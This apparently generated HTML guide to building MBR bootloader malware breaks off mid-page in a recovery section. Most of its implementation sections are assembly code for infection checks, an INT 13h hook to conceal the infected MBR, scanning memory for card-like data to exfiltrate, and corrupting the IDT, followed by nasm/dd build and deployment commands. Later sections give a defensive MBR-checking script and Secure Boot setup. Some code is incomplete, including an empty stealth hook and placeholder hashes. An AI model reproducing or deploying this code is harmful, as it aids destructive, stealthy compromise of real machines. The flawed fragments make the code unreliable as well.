<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bootloader Malware: Advanced Technical Implementation Guide</title>
    <style>
        :root {
            --primary-color: #1a1a2e;
            --secondary-color: #16213e;
            --accent-color: #0f3460;
            --text-color: #e1e1e1;
            --code-bg: #1e1e30;
            --code-color: #00b4d8;
            --border-color: #444444;
            --warning-color: #e94560;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            background-color: var(--primary-color);
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background-color: var(--secondary-color);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
            border-left: 5px solid var(--accent-color);
        }
        
        h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
            color: #ffffff;
        }
        
        h2 {
            font-size: 1.8rem;
            margin: 30px 0 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border-color);
            color: #ffffff;
        }
        
        h3 {
            font-size: 1.4rem;
            margin: 25px 0 10px;
            color: #ffffff;
        }
        
        h4 {
            font-size: 1.2rem;
            margin: 20px 0 10px;
            color: #ffffff;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        code {
            font-family: 'Consolas', 'Monaco', monospace;
            background-color: var(--code-bg);
            color: var(--code-color);
            padding: 2px 4px;
            border-radius: 4px;
            font-size: 0.9rem;
        }
        
        pre {
            background-color: var(--code-bg);
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            margin-bottom: 20px;
            border-left: 3px solid var(--accent-color);
        }
        
        pre code {
            background-color: transparent;
            padding: 0;
            color: #00b4d8;
        }
        
        ul, ol {
            margin: 15px 0;
            padding-left: 30px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .note {
            background-color: var(--secondary-color);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #4cc9f0;
        }
        
        .warning {
            background-color: rgba(233, 69, 96, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid var(--warning-color);
        }
        
        .note h4, .warning h4 {
            margin-top: 0;
            color: #ffffff;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid var(--border-color);
        }
        
        th {
            background-color: var(--secondary-color);
        }
        
        tr:nth-child(even) {
            background-color: rgba(22, 33, 62, 0.3);
        }
        
        .toc {
            background-color: var(--secondary-color);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
        }
        
        .toc h3 {
            margin-top: 0;
        }
        
        .toc ul {
            list-style-type: none;
        }
        
        .toc ul ul {
            padding-left: 20px;
        }
        
        .toc li {
            margin-bottom: 5px;
        }
        
        .toc a {
            color: var(--text-color);
            text-decoration: none;
        }
        
        .toc a:hover {
            color: #ffffff;
            text-decoration: underline;
        }
        
        .section {
            margin-bottom: 40px;
        }
        
        .subsection {
            margin-bottom: 30px;
        }
        
        .image-container {
            margin: 20px 0;
            text-align: center;
        }
        
        .image-container img {
            max-width: 100%;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }
        
        .caption {
            font-style: italic;
            margin-top: 10px;
            color: #aaaaaa;
        }
        
        .code-filename {
            font-family: 'Consolas', 'Monaco', monospace;
            background-color: var(--secondary-color);
            padding: 5px 10px;
            border-radius: 5px 5px 0 0;
            font-size: 0.9rem;
            border: 1px solid var(--border-color);
            border-bottom: none;
        }
        
        .code-block {
            margin-bottom: 25px;
        }
        
        .code-block pre {
            margin-top: 0;
            border-top-left-radius: 0;
        }
        
        footer {
            margin-top: 50px;
            padding-top: 20px;
            border-top: 1px solid var(--border-color);
            text-align: center;
            color: #888888;
        }
        
        .flex-container {
            display: flex;
            gap: 20px;
            margin: 20px 0;
        }
        
        .flex-item {
            flex: 1;
        }
        
        @media (max-width: 768px) {
            .flex-container {
                flex-direction: column;
            }
        }
        
        .memory-diagram {
            background-color: var(--secondary-color);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
        }
        
        .memory-block {
            display: flex;
            margin-bottom: 5px;
            border: 1px solid var(--border-color);
        }
        
        .memory-address {
            background-color: var(--code-bg);
            padding: 5px 10px;
            min-width: 100px;
            border-right: 1px solid var(--border-color);
            color: var(--code-color);
        }
        
        .memory-description {
            padding: 5px 10px;
            flex: 1;
        }

        .mode-diagram {
            display: flex;
            gap: 20px;
            margin: 20px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .mode-box {
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 15px;
            flex: 1;
            min-width: 250px;
            background-color: var(--secondary-color);
        }
        
        .mode-title {
            text-align: center;
            margin-bottom: 10px;
            font-weight: bold;
            font-size: 1.1rem;
        }
        
        .arrow-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 10px 0;
        }
        
        .arrow {
            font-size: 2rem;
        }
    </style>
</head>
<body>
    <header>
        <h1>Bootloader Malware: Advanced Technical Implementation Guide</h1>
        <p>This comprehensive guide details the technical architecture, implementation strategies, and operational mechanics of bootloader-based malware that leverages both 16-bit real mode and 32-bit protected mode execution environments.</p>
        <div class="warning">
            <h4>Educational Purpose Notice</h4>
            <p>This documentation is provided strictly for educational purposes in controlled environments. Implementation of these techniques outside authorized security research contexts may violate applicable laws. The techniques described herein demonstrate lower-level system manipulation for security analysis and defense strategy development.</p>
        </div>
    </header>
    
    <div class="toc">
        <h3>Table of Contents</h3>
        <ul>
            <li><a href="#introduction">1. Introduction</a></li>
            <li><a href="#system-architecture">2. System Architecture</a>
                <ul>
                    <li><a href="#memory-layout">2.1 Memory Layout</a></li>
                    <li><a href="#execution-flow">2.2 Execution Flow</a></li>
                    <li><a href="#mode-transition">2.3 Real Mode to Protected Mode Transition</a></li>
                </ul>
            </li>
            <li><a href="#implementation">3. Implementation Deep Dive</a>
                <ul>
                    <li><a href="#core-functionality">3.1 Core Functionality</a></li>
                    <li><a href="#hooks-persistence">3.2 Hooks and Persistence Mechanisms</a></li>
                    <li><a href="#advanced-techniques">3.3 Advanced Techniques</a></li>
                </ul>
            </li>
            <li><a href="#deployment">4. Compilation and Deployment</a>
                <ul>
                    <li><a href="#build-environment">4.1 Build Environment Setup</a></li>
                    <li><a href="#testing">4.2 Testing in Isolated Environments</a></li>
                </ul>
            </li>
            <li><a href="#defense">5. Defense Strategies</a>
                <ul>
                    <li><a href="#detection">5.1 Detection Mechanisms</a></li>
                    <li><a href="#prevention">5.2 Prevention Techniques</a></li>
                    <li><a href="#recovery">5.3 Recovery Procedures</a></li>
                </ul>
            </li>
            <li><a href="#appendix">6. Appendix</a>
                <ul>
                    <li><a href="#reference">6.1 Technical Reference</a></li>
                    <li><a href="#glossary">6.2 Glossary</a></li>
                </ul>
            </li>
        </ul>
    </div>
    
    <section class="section" id="introduction">
        <h2>1. Introduction</h2>
        <p>Bootloader malware represents one of the most sophisticated threat vectors in systems security, operating at the lowest levels of system initialization before security controls load. By targeting the Master Boot Record (MBR) and leveraging the transition between 16-bit real mode and 32-bit protected mode, these implementations can achieve persistence, stealth, and profound system compromise.</p>
        
        <p>This documentation provides an enterprise-grade technical analysis of bootloader malware architecture with a focus on:</p>
        
        <ul>
            <li>System-level implementation constraints and considerations</li>
            <li>Execution environment transitions (16-bit to 32-bit)</li>
            <li>Advanced persistence mechanisms</li>
            <li>Boot-time hooking techniques</li>
            <li>Memory manipulation strategies</li>
        </ul>
        
        <div class="note">
            <h4>Key Technical Challenges</h4>
            <p>Bootloader malware development presents unique technical challenges, including strict size limitations (512 bytes for MBR), execution in a minimal environment without OS services, and navigation of processor mode transitions. This guide addresses each constraint with production-grade solutions.</p>
        </div>
    </section>
    
    <section class="section" id="system-architecture">
        <h2>2. System Architecture</h2>
        
        <section class="subsection" id="memory-layout">
            <h3>2.1 Memory Layout</h3>
            <p>The memory architecture of bootloader malware requires precise planning to operate within the constraints of early system execution. The following diagram illustrates the optimal memory layout for maximum efficiency and stealth:</p>
            
            <div class="memory-diagram">
                <div class="memory-block">
                    <div class="memory-address">0x0000-0x03FF</div>
                    <div class="memory-description">Interrupt Vector Table (IVT) - Target for hooks</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x0400-0x04FF</div>
                    <div class="memory-description">BIOS Data Area (BDA)</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x0500-0x07FF</div>
                    <div class="memory-description">Free Memory (Usable)</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x0800</div>
                    <div class="memory-description">GDT Location (Global Descriptor Table)</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x7000</div>
                    <div class="memory-description">Stack Base Location</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x7C00</div>
                    <div class="memory-description">Boot Sector Entry Point (Primary Code)</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x7E00</div>
                    <div class="memory-description">MBR Backup Location</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x8000</div>
                    <div class="memory-description">Additional Malware Sectors Buffer</div>
                </div>
                <div class="memory-block">
                    <div class="memory-address">0x100000+</div>
                    <div class="memory-description">Extended Memory (Protected Mode Operations)</div>
                </div>
            </div>
            
            <p>This memory layout optimizes for several critical factors:</p>
            
            <ul>
                <li><strong>Strategic Positioning:</strong> Critical components are positioned to avoid system overwrites</li>
                <li><strong>Execution Efficiency:</strong> Code segments are aligned for optimal processor access</li>
                <li><strong>IVT Proximity:</strong> Facilitates efficient hook installation for system calls</li>
                <li><strong>Mode Transition Support:</strong> Memory layout supports both real mode and protected mode operations</li>
            </ul>
        </section>
        
        <section class="subsection" id="execution-flow">
            <h3>2.2 Execution Flow</h3>
            
            <p>The bootloader malware execution flow follows a sophisticated multi-stage process designed for maximum effectiveness:</p>
            
            <div class="code-block">
                <div class="code-filename">Execution Flow Pseudocode</div>
                <pre><code>
STAGE 1: Initial Execution (16-bit Real Mode)
├── System Initialization
│   ├── Set up segments (DS, ES, SS)
│   ├── Initialize stack pointer
│   └── Prepare execution environment
│
├── Installation Check
│   ├── Verify malware signature
│   └── Branch based on installation status
│
├── If Not Installed:
│   ├── Backup original MBR
│   ├── Load additional payload sectors
│   ├── Install persistence mechanisms
│   └── Transition to protected mode
│
├── If Already Installed:
│   └── Execute stealth routine (jump to original MBR)
│
STAGE 2: Protected Mode Execution (32-bit)
├── Initialize protected mode environment
│   ├── Set up segment registers
│   └── Establish stack
│
├── Execute advanced payload
│   ├── Scan memory for valuable data
│   ├── Corrupt system structures
│   └── Implement primary malicious functionality
                </code></pre>
            </div>
            
            <p>The strategic decomposition of execution into distinct operational phases enables:</p>
            
            <ul>
                <li><strong>Environmental Adaptation:</strong> Tailors execution based on system state and previous installation</li>
                <li><strong>Progressive Capability Expansion:</strong> Evolves from limited 16-bit environment to powerful 32-bit operations</li>
                <li><strong>Fault Tolerance:</strong> Implements recovery mechanisms at critical execution points</li>
                <li><strong>Stealth Operations:</strong> Maintains system appearance for detection avoidance</li>
            </ul>
        </section>
        
        <section class="subsection" id="mode-transition">
            <h3>2.3 Real Mode to Protected Mode Transition</h3>
            
            <p>The critical transition from 16-bit real mode to 32-bit protected mode represents one of the most technically sophisticated aspects of bootloader malware implementation:</p>
            
            <div class="mode-diagram">
                <div class="mode-box">
                    <div class="mode-title">16-bit Real Mode</div>
                    <ul>
                        <li>1MB addressable memory</li>
                        <li>Segmented memory model</li>
                        <li>Direct BIOS access</li>
                        <li>No memory protection</li>
                        <li>Limited instruction set</li>
                    </ul>
                </div>
                
                <div class="mode-box">
                    <div class="mode-title">Transition Requirements</div>
                    <ol>
                        <li>Disable interrupts (CLI)</li>
                        <li>Load GDT structure</li>
                        <li>Enable A20 line</li>
                        <li>Set PE bit in CR0</li>
                        <li>Far jump to flush pipeline</li>
                        <li>Initialize protected mode segments</li>
                    </ol>
                </div>
                
                <div class="mode-box">
                    <div class="mode-title">32-bit Protected Mode</div>
                    <ul>
                        <li>4GB addressable memory</li>
                        <li>Flat memory model option</li>
                        <li>No direct BIOS access</li>
                        <li>Memory protection</li>
                        <li>Extended instruction set</li>
                    </ul>
                </div>
            </div>
            
            <p>The implementation handles this transition with enterprise-grade reliability through:</p>
            
            <div class="code-block">
                <div class="code-filename">transition_to_protected_mode Function</div>
                <pre><code>
transition_to_protected_mode:
    cli                            ; Disable interrupts
    
    ; Load GDT
    lgdt [gdt_ptr]
    
    ; Copy GDT to its final location
    mov si, gdt_data
    mov di, GDT_LOCATION
    mov cx, gdt_ptr - gdt_data
    rep movsb
    
    ; Enable A20 line
    call enable_a20
    
    ; Enable protected mode by setting PE bit (bit 0) in CR0
    mov eax, cr0
    or eax, 1
    mov cr0, eax
    
    ; Perform far jump to flush pipeline and load CS with 32-bit segment
    jmp 0x08:protected_mode_entry
                </code></pre>
            </div>
            
            <div class="note">
                <h4>Critical System Consideration</h4>
                <p>A20 line activation represents a significant technical challenge with multiple approaches required for cross-platform compatibility. The implementation includes both BIOS-based and direct keyboard controller methods to ensure maximum reliability across diverse system configurations.</p>
            </div>
        </section>
    </section>
    
    <section class="section" id="implementation">
        <h2>3. Implementation Deep Dive</h2>
        
        <section class="subsection" id="core-functionality">
            <h3>3.1 Core Functionality</h3>
            
            <p>The implementation's core functionality consists of several mission-critical components engineered for maximum effectiveness and reliability:</p>
            
            <h4>3.1.1 Installation Verification</h4>
            
            <p>The implementation employs a sophisticated signature-based detection system to identify previous installation, preventing redundant execution and potential system instability:</p>
            
            <div class="code-block">
                <div class="code-filename">check_installation Function</div>
                <pre><code>
check_installation:
    push es
    push di
    
    ; Check specific memory location for our signature
    xor ax, ax
    mov es, ax
    mov di, 0x7C00 + 510
    mov ax, [es:di]
    cmp ax, MALWARE_SIGNATURE
    je .already_installed
    
    clc                            ; Clear carry flag (not installed)
    jmp .done
    
.already_installed:
    stc                            ; Set carry flag (already installed)
    
.done:
    pop di
    pop es
    ret
                </code></pre>
            </div>
            
            <h4>3.1.2 MBR Backup and Preservation</h4>
            
            <p>To maintain system stability and enable stealth operations, the implementation includes a robust MBR backup mechanism:</p>
            
            <div class="code-block">
                <div class="code-filename">backup_original_mbr Function</div>
                <pre><code>
backup_original_mbr:
    push es
    push di
    push si
    push cx
    
    ; Set up source and destination
    xor ax, ax
    mov ds, ax
    mov si, 0x7C00                 ; Source: current boot sector
    mov ax, 0
    mov es, ax
    mov di, MBR_BACKUP_LOCATION    ; Destination: backup location
    mov cx, 512                    ; Copy 512 bytes (entire MBR)
    rep movsb                      ; Perform the copy
    
    pop cx
    pop si
    pop di
    pop es
    ret
                </code></pre>
            </div>
            
            <h4>3.1.3 Additional Payload Loading</h4>
            
            <p>The implementation employs sophisticated disk I/O operations to load additional payload components beyond the 512-byte MBR limitation:</p>
            
            <div class="code-block">
                <div class="code-filename">load_additional_sectors Function</div>
                <pre><code>
load_additional_sectors:
    push es
    push bx
    
    ; Set up registers for disk read
    mov ah, 0x02                   ; BIOS read sector function
    mov al, SECTORS_TO_READ        ; Number of sectors to read
    mov ch, 0                      ; Cylinder 0
    mov cl, 2                      ; Start from sector 2 (sector after boot sector)
    mov dh, 0                      ; Head 0
    mov dl, [0x7C00 + 0x1FE - 2]   ; Use drive number from original boot sector
    
    ; Set up memory location to read to
    mov bx, TARGET_BUFFER / 16     ; ES:BX will point to the target buffer
    mov es, bx
    xor bx, bx
    
    ; Perform the read
    int 0x13
    jc .disk_error                 ; Jump if carry flag set (error)
    
    pop bx
    pop es
    ret
                </code></pre>
            </div>
        </section>
        
        <section class="subsection" id="hooks-persistence">
            <h3>3.2 Hooks and Persistence Mechanisms</h3>
            
            <p>The implementation achieves persistence through sophisticated system hooks and stealthy operation techniques:</p>
            
            <h4>3.2.1 Interrupt Vector Table Hooks</h4>
            
            <p>By intercepting critical system calls through IVT manipulation, the implementation maintains control over system operations:</p>
            
            <div class="code-block">
                <div class="code-filename">install_persistence Function</div>
                <pre><code>
install_persistence:
    ; Write our signature to mark the MBR as infected
    mov word [0x7C00 + 510], MALWARE_SIGNATURE
    
    ; Hook interrupt vector table (IVT) for persistence
    xor ax, ax
    mov es, ax
    
    ; Hook INT 13h (disk services)
    cli                            ; Disable interrupts while modifying IVT
    mov word [es:0x13*4], hook_int13
    mov word [es:0x13*4+2], 0      ; Segment 0
    sti                            ; Re-enable interrupts
    
    ret
                </code></pre>
            </div>
            
            <h4>3.2.2 Disk Operation Interception</h4>
            
            <p>The implementation's INT 13h hook enables sophisticated disk operation monitoring and modification:</p>
            
            <div class="code-block">
                <div class="code-filename">hook_int13 Function</div>
                <pre><code>
hook_int13:
    cmp ah, 0x02                   ; Is this a disk read?
    jne .pass_through
    cmp cx, 0x0001                 ; Is this reading the MBR? (Cylinder 0, Sector 1)
    jne .pass_through
    
    pushf
    call far [cs:original_int13]   ; Call original handler
    
    ; After original handler, check if we need to conceal ourselves
    push ax
    push bx
    push es
    
    ; Check if reading occurred to the MBR and modify it before returning
    ; This will hide our modifications from security software
    
    pop es
    pop bx
    pop ax
    iret
    
.pass_through:
    jmp far [cs:original_int13]    ; Pass through to original handler
                </code></pre>
            </div>
            
            <div class="note">
                <h4>Advanced Stealth Technique</h4>
                <p>The hook_int13 implementation demonstrates a sophisticated on-the-fly deception technique, presenting unmodified MBR data to system utilities while maintaining actual modifications on disk. This technique significantly complicates detection and removal efforts.</p>
            </div>
        </section>
        
        <section class="subsection" id="advanced-techniques">
            <h3>3.3 Advanced Techniques</h3>
            
            <h4>3.3.1 Memory Scanning</h4>
            
            <p>In protected mode, the implementation leverages 32-bit capabilities to perform sophisticated memory scanning operations:</p>
            
            <div class="code-block">
                <div class="code-filename">scan_memory Function (32-bit Protected Mode)</div>
                <pre><code>
scan_memory:
    ; Set up memory range to scan
    mov esi, 0x100000              ; Start at 1MB mark
    mov ecx, 0x100000              ; Scan 1MB of memory
    
.scan_loop:
    mov eax, [esi]                 ; Read DWORD from memory
    
    ; Look for specific signatures (credit card patterns, etc.)
    cmp eax, 0x12345678            ; Example signature
    je .target_found
    
    add esi, 4                     ; Move to next DWORD
    loop .scan_loop                ; Continue until ECX = 0
    
    ret
    
.target_found:
    ; Store location of found data for later exfiltration
    mov [found_data_ptr], esi
    ret
                </code></pre>
            </div>
            
            <h4>3.3.2 System Structure Manipulation</h4>
            
            <p>The implementation includes sophisticated techniques for manipulating critical system structures:</p>
            
            <div class="code-block">
                <div class="code-filename">corrupt_system_structures Function (32-bit Protected Mode)</div>
                <pre><code>
corrupt_system_structures:
    ; Corrupt IDT (Interrupt Descriptor Table)
    mov esi, 0                     ; IDT typically located at low memory
    mov ecx, 256                   ; 256 entries in IDT
    
.corrupt_idt_loop:
    ; Overwrite IDT entries with invalid handlers
    mov dword [esi], 0xDEADBEEF
    mov dword [esi+4], 0xCAFEBABE
    
    add esi, 8                     ; Move to next IDT entry
    loop .corrupt_idt_loop
    
    ; Corrupt other critical system structures
    ; This is where more sophisticated attacks would be implemented
    
    ret
                </code></pre>
            </div>
        </section>
    </section>
    
    <section class="section" id="deployment">
        <h2>4. Compilation and Deployment</h2>
        
        <section class="subsection" id="build-environment">
            <h3>4.1 Build Environment Setup</h3>
            
            <p>Building bootloader malware requires a precise toolchain configuration to ensure proper binary generation:</p>
            
            <div class="code-block">
                <div class="code-filename">Build Environment Configuration</div>
                <pre><code>
# Required Tools
# - NASM (Netwide Assembler) 2.15+ 
# - QEMU for testing
# - Optional: Hex editor for verification

# Environment Setup (Linux)
sudo apt-get install nasm qemu-system-x86

# Environment Setup (macOS)
brew install nasm qemu

# Environment Setup (Windows)
# Download NASM from https://www.nasm.us/
# Download QEMU from https://www.qemu.org/download/
                </code></pre>
            </div>
            
            <h4>4.1.1 Compilation Process</h4>
            
            <p>The compilation process transforms the assembly source into a binary boot sector:</p>
            
            <div class="code-block">
                <div class="code-filename">Compilation Commands</div>
                <pre><code>
# Compile 16/32-bit hybrid code
nasm -f bin bootloader-malware.asm -o bootloader.bin

# Verify size (must be exactly 512 bytes for boot sector)
ls -la bootloader.bin

# Create disk image (for testing or deployment)
dd if=/dev/zero of=disk.img bs=1M count=10
dd if=bootloader.bin of=disk.img conv=notrunc

# Optional: Add secondary payload sectors
dd if=additional_payload.bin of=disk.img bs=512 seek=1 conv=notrunc
                </code></pre>
            </div>
            
            <h4>4.1.2 Binary Verification</h4>
            
            <p>Critical verification steps ensure proper binary structure and boot sector compliance:</p>
            
            <div class="code-block">
                <div class="code-filename">Binary Verification</div>
                <pre><code>
# Verify boot signature (last two bytes must be 0x55, 0xAA)
hexdump -C -n 512 bootloader.bin | tail -1

# Expected output should end with: 55 aa

# Verify size is exactly 512 bytes
if [ $(stat -c%s bootloader.bin) -eq 512 ]; then
    echo "Valid boot sector size"
else
    echo "Invalid boot sector size"
fi
                </code></pre>
            </div>
        </section>
        
        <section class="subsection" id="testing">
            <h3>4.2 Testing in Isolated Environments</h3>
            
            <p>Testing in controlled environments is essential for verification and technical validation:</p>
            
            <div class="code-block">
                <div class="code-filename">Testing Commands</div>
                <pre><code>
# Basic QEMU testing
qemu-system-i386 -hda disk.img

# Advanced testing with debugging
qemu-system-i386 -hda disk.img -s -S &
gdb -ex "target remote localhost:1234" \
    -ex "set architecture i8086" \
    -ex "break *0x7c00" \
    -ex "continue"

# Testing with memory dumps
qemu-system-i386 -hda disk.img -monitor stdio
(qemu) info registers
(qemu) x /64xb 0x7c00
                </code></pre>
            </div>
            
            <div class="warning">
                <h4>Important Testing Precaution</h4>
                <p>Always conduct testing in completely isolated environments, preferably air-gapped systems or virtual machines without network connectivity. The payload's behavioral validation should never be performed on production systems or networks connected to production environments.</p>
            </div>
        </section>
    </section>
    
    <section class="section" id="defense">
        <h2>5. Defense Strategies</h2>
        
        <section class="subsection" id="detection">
            <h3>5.1 Detection Mechanisms</h3>
            
            <p>Understanding bootloader malware implementation enables the development of advanced detection strategies:</p>
            
            <div class="code-block">
                <div class="code-filename">MBR Verification Script (Python)</div>
                <pre><code>
#!/usr/bin/env python3
"""
Enterprise-grade MBR verification tool for bootloader integrity validation.
"""
import sys
import struct
import hashlib
from typing import List, Tuple, Dict, Optional

# Known-good MBR hashes for validation
KNOWN_GOOD_HASHES = {
    "Windows 10": "a1b2c3d4e5f6...",  # Example hash
    "Windows 11": "f6e5d4c3b2a1...",  # Example hash
    "Ubuntu 22.04": "1a2b3c4d5e6f..."  # Example hash
}

class MBRAnalyzer:
    """Advanced MBR analysis and verification engine."""
    
    def __init__(self, mbr_path: str):
        """Initialize with path to MBR image or device."""
        self.mbr_path = mbr_path
        self.mbr_data = self._read_mbr()
        self.signatures = []
        self.anomalies = []
    
    def _read_mbr(self) -> bytes:
        """Read MBR data from file or device."""
        try:
            with open(self.mbr_path, "rb") as f:
                return f.read(512)
        except Exception as e:
            print(f"Error reading MBR: {e}")
            sys.exit(1)
    
    def verify_boot_signature(self) -> bool:
        """Verify standard boot signature (0x55AA)."""
        return self.mbr_data[-2:] == b'\x55\xAA'
    
    def compute_hash(self) -> str:
        """Compute SHA-256 hash of MBR."""
        return hashlib.sha256(self.mbr_data).hexdigest()
    
    def check_known_signatures(self) -> List[str]:
        """Check for known malicious signatures."""
        signatures = []
        
        # Check for common hex patterns
        if b'\xDE\xAD\xBE\xEF' in self.mbr_data:
            signatures.append("Potential malicious marker: DEADBEEF")
        
        # Check for suspicious jump patterns
        if self.mbr_data[0] == 0xEB and self.mbr_data[2] == 0x90:
            if self.mbr_data[1] > 0x3C:  # Unusually far jump
                signatures.append("Suspicious far jump in MBR header")
        
        # Check for INT 13h hooks
        if b'\xCD\x13\xCB' in self.mbr_data:  # INT 13h followed by RETF
            signatures.append("Potential INT 13h hook detected")
        
        return signatures
    
    def scan_for_anomalies(self) -> List[str]:
        """Perform advanced anomaly detection."""
        anomalies = []
        
        # Check for suspicious protected mode transition
        if b'\x0F\x01\x16' in self.mbr_data:  # LGDT instruction
            if b'\xB8\x01\x00\x00\x00\x0F\x22\xC0' in self.mbr_data:  # MOV CR0
                anomalies.append("Protected mode transition detected in MBR")
        
        # Analyze partition table integrity
        partition_table = self.mbr_data[0x1BE:0x1FE]
        for i in range(0, 64, 16):
            partition = partition_table[i:i+16]
            if partition[0] & 0x80:  # Boot flag set
                if partition[4] == 0:  # Partition type
                    anomalies.append(f"Invalid partition type in bootable partition {i//16 + 1}")
        
        return anomalies
    
    def analyze(self) -> Dict[str, any]:
        """Perform comprehensive MBR analysis."""
        hash_value = self.compute_hash()
        boot_sig_valid = self.verify_boot_signature()
        self.signatures = self.check_known_signatures()
        self.anomalies = self.scan_for_anomalies()
        
        known_os = None
        for os_name, os_hash in KNOWN_GOOD_HASHES.items():
            if hash_value == os_hash:
                known_os = os_name
                break
        
        return {
            "hash": hash_value,
            "boot_signature_valid": boot_sig_valid,
            "known_os_match": known_os,
            "suspicious_signatures": self.signatures,
            "anomalies": self.anomalies,
            "risk_level": self._calculate_risk_level()
        }
    
    def _calculate_risk_level(self) -> str:
        """Calculate risk level based on findings."""
        if not self.verify_boot_signature():
            return "CRITICAL"
        
        if len(self.signatures) > 2:
            return "HIGH"
        elif len(self.signatures) > 0 or len(self.anomalies) > 2:
            return "MEDIUM"
        elif len(self.anomalies) > 0:
            return "LOW"
        
        return "SECURE"


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <mbr_image_or_device>")
        sys.exit(1)
    
    analyzer = MBRAnalyzer(sys.argv[1])
    results = analyzer.analyze()
    
    print("\n=== MBR ANALYSIS REPORT ===")
    print(f"SHA-256 Hash: {results['hash']}")
    print(f"Boot Signature Valid: {results['boot_signature_valid']}")
    print(f"Known OS Match: {results['known_os_match'] or 'None'}")
    print(f"Risk Level: {results['risk_level']}")
    
    if results['suspicious_signatures']:
        print("\nSuspicious Signatures Detected:")
        for sig in results['suspicious_signatures']:
            print(f"  - {sig}")
    
    if results['anomalies']:
        print("\nAnomalies Detected:")
        for anomaly in results['anomalies']:
            print(f"  - {anomaly}")
    
    print("\nRecommendation:", end=" ")
    if results['risk_level'] in ["HIGH", "CRITICAL"]:
        print("IMMEDIATE REMEDIATION REQUIRED")
    elif results['risk_level'] == "MEDIUM":
        print("Further investigation recommended")
    else:
        print("Monitor system for changes")


if __name__ == "__main__":
    main()
                </code></pre>
            </div>
        </section>
        
        <section class="subsection" id="prevention">
            <h3>5.2 Prevention Techniques</h3>
            
            <p>Enterprise-grade prevention strategies leverage multiple layers of protection:</p>
            
            <ul>
                <li><strong>Secure Boot Implementation:</strong> UEFI Secure Boot with hardware-backed cryptographic verification prevents unauthorized bootloader execution.</li>
                <li><strong>TPM-Based Integrity Measurement:</strong> Leveraging Trusted Platform Module for boot-time integrity verification.</li>
                <li><strong>Boot Guard Technology:</strong> Intel Boot Guard and AMD Hardware-Validated Boot provide silicon-level protection against bootloader modification.</li>
                <li><strong>MBR/VBR Write Protection:</strong> Implementing hardware or firmware-based write protection for boot sectors.</li>
                <li><strong>Regular Integrity Validation:</strong> Scheduled cryptographic verification of boot components against known-good baselines.</li>
            </ul>
            
            <div class="code-block">
                <div class="code-filename">UEFI Secure Boot Configuration (Enterprise Policy)</div>
                <pre><code>
# UEFI PK (Platform Key) and KEK (Key Exchange Key) Setup
# This is typically handled through UEFI firmware interface or enterprise management tools

# Example: Linux UEFI SecureBoot Key Management
efi-readvar # View current Secure Boot configuration

# Generate Platform Key (PK)
openssl req -new -x509 -newkey rsa:2048 -subj "/CN=Enterprise Platform Key/" \
  -keyout PK.key -out PK.crt -days 3650 -nodes
cert-to-efi-sig-list -g "$(uuidgen)" PK.crt PK.esl
sign-efi-sig-list -k PK.key -c PK.crt PK PK.esl PK.auth

# Generate Key Exchange Key (KEK)
openssl req -new -x509 -newkey rsa:2048 -subj "/CN=Enterprise Key Exchange Key/" \
  -keyout KEK.key -out KEK.crt -days 3650 -nodes
cert-to-efi-sig-list -g "$(uuidgen)" KEK.crt KEK.esl
sign-efi-sig-list -k PK.key -c PK.crt KEK KEK.esl KEK.auth

# Generate DB (Signature Database)
openssl req -new -x509 -newkey rsa:2048 -subj "/CN=Enterprise Signature Database/" \
  -keyout db.key -out db.crt -days 3650 -nodes
cert-to-efi-sig-list -g "$(uuidgen)" db.crt db.esl
sign-efi-sig-list -k KEK.key -c KEK.crt db db.esl db.auth

# Install keys (system must be in Setup Mode)
efi-updatevar -e -f PK.auth PK
efi-updatevar -e -f KEK.auth KEK
efi-updatevar -e -f db.auth db

# Configure enterprise bootloader signing policy
sbsign --key db.key --cert db.crt --output /boot/efi/EFI/BOOT/BOOTX64.EFI.signed /boot/efi/EFI/BOOT/BOOTX64.EFI
mv /boot/efi/EFI/BOOT/BOOTX64.EFI.signed /boot/efi/EFI/BOOT/BOOTX64.EFI
                </code></pre>
            </div>
        </section>
        
        <section class="subsection" id="recovery">
            <h3>5.3 Recovery Procedures</h3>
            
            <p>When bootloader malware is detected, a systematic recovery approach is essential:</p>
            
            <ol>
                <li><strong>System Isolation:</strong> Disconnect affected systems from all networks and external devices.</li>
                <li><strong>Forensic Evidence Collection:</strong> Create sector-by-sector image of affected storage devices.</li>
                <li><strong>Controlled Recovery:</strong> Boot from trusted external media and implement recovery plan.</li>
                <li><strong>MBR/VBR Restoration:</strong> Restore clean boot sectors from known-good backups or original installation media.</li>
                <li><strong>Integrity Verification:</strong> Validate restored system with cryptographic verification.</li>
                <li><strong>Secondary Persistence Elimination:</strong> Check for and remove additional persistence mechanisms.</li>
                <li><strong>Root Cause Analysis:</strong> Identify and address the infection vector.</li>
            </ol>
            
            <div class="code-block">
